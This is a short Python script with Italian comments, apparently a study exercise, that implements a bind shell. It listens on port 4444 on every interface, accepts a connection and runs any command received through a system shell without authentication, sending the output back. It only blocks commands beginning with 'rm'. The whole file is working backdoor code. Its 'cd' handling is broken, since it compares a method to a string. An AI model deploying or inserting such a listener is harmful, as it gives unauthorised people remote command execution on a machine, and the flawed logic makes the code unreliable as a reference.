import socket as so #IMPORTATO LA LIBRERIA SOCKET
import os
import subprocess

SRV_ADDR = "" #se vuoto utilizza tutte le interfacce,altrimenti quella di appartenenza dell'ip
SRV_PORT = 4444 #la porta da dove ascolta

s = so.socket(so.AF_INET, so.SOCK_STREAM) #La s diventa istanza di classe
s.bind((SRV_ADDR,SRV_PORT)) #abbiamo chiesto di riservare una porta
s.listen(1)
print("sto attendendo una connessione")
connection ,adress= s.accept()
print("ho stabilito una connessione con :", adress)
percorso_partenza = os.getcwd()
while True:
    prompt = percorso_partenza+"$"
    connection.sendall(prompt.encode("utf-8"))#encode trasforma in utf-8
    data = connection.recv(1024)
    if not data: break 
    comando = data.decode("utf-8")
    result = ""
    if(comando.startswith=='cd'):
        os.chdir(comando.replace("cd", "").replace('\n',''))
        percorso_partenza = os.getcwd()
    elif(comando.startswith ('rm')):
        result = "ci hai provato"
    else:
        res = subprocess.run(comando,cwd=percorso_partenza,shell=True,capture_output=True, text=True)
        result = res.stdout 
        if(res.stderr):result = f"{result}\n{res.stderr} "  
    result =result+ "\n"    
    connection.sendall(result.encode("utf-8"))   
connection.close()  